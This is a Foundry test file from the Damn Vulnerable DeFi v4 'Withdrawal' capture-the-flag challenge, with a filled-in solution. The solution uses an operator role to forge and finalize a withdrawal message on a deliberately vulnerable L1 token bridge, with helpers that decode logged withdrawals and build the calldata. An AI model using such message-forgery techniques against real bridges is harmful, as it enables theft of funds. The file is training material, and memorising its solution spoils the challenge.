// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Merkle} from "murky/Merkle.sol";
import {Test, console} from "forge-std/Test.sol";
import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract WithdrawalChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    // Mock addresses of the bridge's L2 components
    address l2MessageStore = makeAddr("l2MessageStore");
    address l2TokenBridge = makeAddr("l2TokenBridge");
    address l2Handler = makeAddr("l2Handler");

    uint256 constant START_TIMESTAMP = 1718786915;
    uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;
    uint256 constant WITHDRAWALS_AMOUNT = 4;
    bytes32 constant WITHDRAWALS_ROOT = 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;

    TokenBridge l1TokenBridge;
    DamnValuableToken token;
    L1Forwarder l1Forwarder;
    L1Gateway l1Gateway;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Start at some realistic timestamp
        vm.warp(START_TIMESTAMP);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy and setup infra for message passing
        l1Gateway = new L1Gateway();
        l1Forwarder = new L1Forwarder(l1Gateway);
        l1Forwarder.setL2Handler(address(l2Handler));

        // Deploy token bridge on L1
        l1TokenBridge = new TokenBridge(token, l1Forwarder, l2TokenBridge);

        // Set bridge's token balance, manually updating the `totalDeposits` value (at slot 0)
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
        vm.store(address(l1TokenBridge), 0, bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));

        // Set withdrawals root in L1 gateway
        l1Gateway.setRoot(WITHDRAWALS_ROOT);

        // Grant player the operator role
        l1Gateway.grantRoles(player, l1Gateway.OPERATOR_ROLE());

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(l1Forwarder.owner(), deployer);
        assertEq(address(l1Forwarder.gateway()), address(l1Gateway));

        assertEq(l1Gateway.owner(), deployer);
        assertEq(l1Gateway.rolesOf(player), l1Gateway.OPERATOR_ROLE());
        assertEq(l1Gateway.DELAY(), 7 days);
        assertEq(l1Gateway.root(), WITHDRAWALS_ROOT);

        assertEq(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_withdrawal() public checkSolvedByPlayer {
        
        //Ref: https://github.com/PitrikYan/DamnVulnerableDefi-V4/blob/main/test/withdrawal/Withdrawal.t.sol
        //Ref: https://medium.com/@letonchanh/damn-vulnerable-defi-v4-new-challenge-solution-walkthrough-withdrawal-part-2-c8757af2ecc0

        address target = address(l1Forwarder); 
        DataHelper dataHelper = new DataHelper();
        DataHelper.Withdrawal[] memory withdrawals = dataHelper.parseDataFromJson("/test/withdrawal/withdrawals.json");
        DataHelper.Withdrawal memory playerWithdrawal;
        playerWithdrawal.sender = player;
        playerWithdrawal.nonce = withdrawals.length;
        playerWithdrawal.timestamp = withdrawals[withdrawals.length-1].timestamp + 1 minutes;
        playerWithdrawal.amount = 800_000e18;
        
        DataHelper.Withdrawal[] memory mergeWithdrawals = new DataHelper.Withdrawal[](withdrawals.length + 1);

        mergeWithdrawals[0] = withdrawals[0];
        mergeWithdrawals[1] = withdrawals[1];
        mergeWithdrawals[2] = playerWithdrawal;
        mergeWithdrawals[3] = withdrawals[2];
        mergeWithdrawals[4] = withdrawals[3];

        for (uint256 i = 0; i < mergeWithdrawals.length; ++i) {
            // pass 7 days
            vm.warp(mergeWithdrawals[i].timestamp + l1Gateway.DELAY());
            bytes memory finalizeCalldata = dataHelper.getFinalizeWithdrawal(l1TokenBridge, l2Handler, target, mergeWithdrawals[i]);
            address(l1Gateway).call(finalizeCalldata);

        }

        token.transfer(address(l1TokenBridge), playerWithdrawal.amount);

    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Token bridge still holds most tokens
        assertLt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertGt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18 / 100e18);

        // Player doesn't have tokens
        assertEq(token.balanceOf(player), 0);

        // All withdrawals in the given set (including the suspicious one) must have been marked as processed and finalized in the L1 gateway
        assertGe(l1Gateway.counter(), WITHDRAWALS_AMOUNT, "Not enough finalized withdrawals");
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"),
            "First withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"),
            "Second withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"),
            "Third withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
            "Fourth withdrawal not finalized"
        );
    }
}
contract DataHelper is Test{
    struct Log {
        bytes data;
        bytes32[] topics;
    }

    struct Withdrawal{
        address sender;
        uint256 nonce;
        uint256 timestamp;
        uint256 amount;
    }

    function parseDataFromJson(string memory path)public view returns (Withdrawal[] memory withdrawals){
        Log[] memory eventLogs = abi.decode(
            vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))),
            (Log[])
        );
        // bytes memory data = getLogData(eventLogs[0].data);
        // getCalldata(data);

        withdrawals = new Withdrawal[](eventLogs.length);
        for (uint i = 0; i < eventLogs.length; i++) {      
            withdrawals[i] = (getLogData(eventLogs[i].data));
        }

    }
   
    function getFinalizeWithdrawal(TokenBridge l1TokenBridge, address l2Handler, address target , Withdrawal calldata withdrawal)public pure returns(bytes memory finalizeCalldata){
        // inner message with call to L1 Token Bridge
         bytes memory message = abi.encodeCall(TokenBridge.executeTokenWithdrawal, (withdrawal.sender, withdrawal.amount));                
        // complete data for forwarder
        bytes memory data = abi.encodeCall(L1Forwarder.forwardMessage, ( withdrawal.nonce, withdrawal.sender, address(l1TokenBridge), message));

        finalizeCalldata = abi.encodeCall(L1Gateway.finalizeWithdrawal, (withdrawal.nonce, l2Handler, target, withdrawal.timestamp, data, new bytes32[](0)));

    }
    
    function getLogData(bytes memory logData)public pure returns (Withdrawal memory withdrawal){
        (bytes32 id, uint256 timestamp,  bytes memory data) = abi.decode(
            logData, (bytes32, uint256, bytes)
        );    
        bytes memory callData;
        callData = extractCalldata(data);
        // console.logBytes(callData);

        // (ForwardMessage memory fwdMsgData) = abi.decode(callData, (ForwardMessage));
        (uint256 nonce, address sender, address target, bytes memory message) = abi.decode(callData, (uint256, address, address, bytes));

        // console.log(fwdMsgData.sender);
        // console.logBytes(fwdMsgData.message);
        
        callData = extractCalldata(message);
        (address receiver, uint256 amount) = abi.decode(callData, (address, uint256));             

        withdrawal.sender = sender;
        withdrawal.nonce = nonce;
        withdrawal.timestamp = timestamp;
        withdrawal.amount = amount; 
    }

    function extractCalldata(bytes memory calldataWithSelector) public pure returns (bytes memory) {
        bytes memory calldataWithoutSelector;

        require(calldataWithSelector.length >= 4);

        assembly {
            let totalLength := mload(calldataWithSelector)
            let targetLength := sub(totalLength, 4)
            calldataWithoutSelector := mload(0x40)
            
            // Set the length of callDataWithoutSelector (initial length - 4)
            mstore(calldataWithoutSelector, targetLength)

            // Mark the memory space taken for callDataWithoutSelector as allocated
            mstore(0x40, add(calldataWithoutSelector, add(0x20, targetLength)))


            // Process first 32 bytes (we only take the last 28 bytes)
            mstore(add(calldataWithoutSelector, 0x20), shl(0x20, mload(add(calldataWithSelector, 0x20))))

            // Process all other data by chunks of 32 bytes
            for { let i := 0x1C } lt(i, targetLength) { i := add(i, 0x20) } {
                mstore(add(add(calldataWithoutSelector, 0x20), i), mload(add(add(calldataWithSelector, 0x20), add(i, 0x04))))
            }
        }

        return calldataWithoutSelector;
    }

}